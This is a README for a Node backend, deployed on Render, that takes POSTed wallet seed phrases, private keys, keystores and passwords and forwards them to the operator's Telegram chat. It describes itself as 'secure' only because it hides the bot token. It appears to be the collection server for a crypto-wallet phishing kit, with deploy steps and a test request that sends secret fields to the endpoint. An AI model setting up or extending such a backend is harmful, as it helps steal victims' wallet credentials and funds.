# Secure Telegram Bot Backend

### 🛡️ Purpose
A secure backend to forward wallet data to Telegram without exposing your bot token.

### 🚀 Deploy on Render (Free)

1. Go to https://render.com
2. Click "New Web Service"
3. Connect your GitHub repo or upload this folder
4. Add Environment Variables:
   - `BOT_TOKEN` = your Telegram bot token
   - `CHAT_ID` = your Telegram chat ID
5. Set the build/run command:
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
6. Click Deploy!

### 🧪 Test

Send a POST request to `/send-to-telegram` with:

```json
{
  "phrase": "test phrase",
  "privateKey": "0xabc...",
  "keystore": "{...}",
  "password": "secret"
}
```

It will forward the data to your Telegram bot.